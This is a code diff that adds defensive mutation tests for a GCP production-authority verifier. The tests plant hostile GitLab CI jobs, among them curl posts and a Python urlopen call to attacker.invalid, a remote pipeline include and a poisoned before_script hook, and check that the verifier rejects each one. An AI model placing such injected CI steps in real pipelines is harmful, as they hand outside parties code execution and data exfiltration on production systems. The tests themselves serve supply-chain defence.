@@ -1,7 +1,11 @@
 from __future__ import annotations
 
+import hashlib
+import json
 import shutil
 from pathlib import Path
+
+import pytest
 
 from scripts.verify_gcp_production import evaluate
 
@@ -16,6 +20,7 @@ def _mutated_repo(tmp_path: Path, relative: str, old: str, new: str) -> Path:
     # Copy only the verifier's production contract surface, not the entire repository.
     for source in [
         "infra/gcp/bootstrap/main.tf",
+        "infra/gcp/bootstrap/variables.tf",
         "infra/gcp/bootstrap/versions.tf",
         "infra/gcp/foundation/main.tf",
         "infra/gcp/foundation/network.tf",
@@ -39,6 +44,8 @@ def _mutated_repo(tmp_path: Path, relative: str, old: str, new: str) -> Path:
         ".github/workflows/gcp-foundation.yml",
         ".github/workflows/gcp-drill.yml",
         ".github/workflows/assurance.yml",
+        ".gitlab-ci.yml",
+        "config/ci/gitlab-readonly-authority-v1.json",
         ".gitignore",
     ]:
         dst = tmp_path / source
@@ -54,6 +61,105 @@ def _mutated_repo(tmp_path: Path, relative: str, old: str, new: str) -> Path:
 def test_current_gcp_production_contract_passes() -> None:
     status = _status(ROOT)
     assert status and all(status.values()), [name for name, ok in status.items() if not ok]
+
+
+def test_reactivated_gitlab_release_job_is_killed(tmp_path: Path) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "production:release:\n  stage: release\n",
+        "production:release:\n  stage: release\n  id_tokens:\n    RELEASE_TOKEN:\n      aud: https://iam.googleapis.com\n",
+    )
+    status = _status(root)
+    assert status["GITLAB_RELEASE_AUTHORITY_RETIRED"] is False
+    assert status["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
+def test_added_gitlab_deploy_command_is_killed(tmp_path: Path) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "gcp:deploy-production:\n",
+        (
+            "attacker:deploy:\n"
+            "  stage: deploy\n"
+            "  script:\n"
+            "    - gcloud run deploy attacker --image example.invalid/attacker\n\n"
+            "gcp:deploy-production:\n"
+        ),
+    )
+    assert _status(root)["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
+@pytest.mark.parametrize(
+    "poison",
+    [
+        "include:\n  - remote: https://attacker.invalid/pipeline.yml\n",
+        "include:\n  - local: attacker-controlled.yml\n",
+        "attacker:child:\n  trigger: attacker/project\n",
+        "attacker:post:\n  script:\n    - curl --data payload https://attacker.invalid/deploy\n",
+        (
+            "attacker:python:\n"
+            "  script:\n"
+            '    - python -c \'__import__("urllib.request").request.urlopen("https://attacker.invalid/deploy")\'\n'
+        ),
+    ],
+)
+def test_gitlab_delegated_or_arbitrary_execution_path_is_killed(
+    tmp_path: Path, poison: str
+) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "gcp:deploy-production:\n",
+        poison + "\ngcp:deploy-production:\n",
+    )
+    assert _status(root)["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
+def test_gitlab_pipeline_and_policy_expansion_together_is_killed(tmp_path: Path) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "gcp:deploy-production:\n",
+        (
+            "attacker:deploy:\n"
+            "  stage: deploy\n"
+            "  script:\n"
+            "    - curl --data payload https://attacker.invalid/deploy\n\n"
+            "gcp:deploy-production:\n"
+        ),
+    )
+    policy_path = root / "config/ci/gitlab-readonly-authority-v1.json"
+    policy = json.loads(policy_path.read_text(encoding="utf-8"))
+    job = {
+        "stage": "deploy",
+        "script": ["curl --data payload https://attacker.invalid/deploy"],
+    }
+    encoded = json.dumps(job, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
+    policy["allowed_job_sha256"]["attacker:deploy"] = hashlib.sha256(encoded).hexdigest()
+    policy_path.write_text(json.dumps(policy), encoding="utf-8")
+    assert _status(root)["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
+def test_gitlab_mutating_default_hook_is_killed(tmp_path: Path) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "default:\n",
+        ("default:\n  before_script:\n    - curl --data payload https://attacker.invalid/deploy\n"),
+    )
+    assert _status(root)["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
+def test_github_production_workflow_binding_mutation_is_killed(tmp_path: Path) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        "infra/gcp/bootstrap/main.tf",
+        'workflow_path = ".github/workflows/gcp-production.yml"',
+        'workflow_path = ".github/workflows/attacker-controlled.yml"',
+    )
+    assert _status(root)["GITHUB_PRODUCTION_AUTHORITY_BOUND"] is False
 
 
 def test_connector_enforcement_mutation_is_killed(tmp_path: Path) -> None:
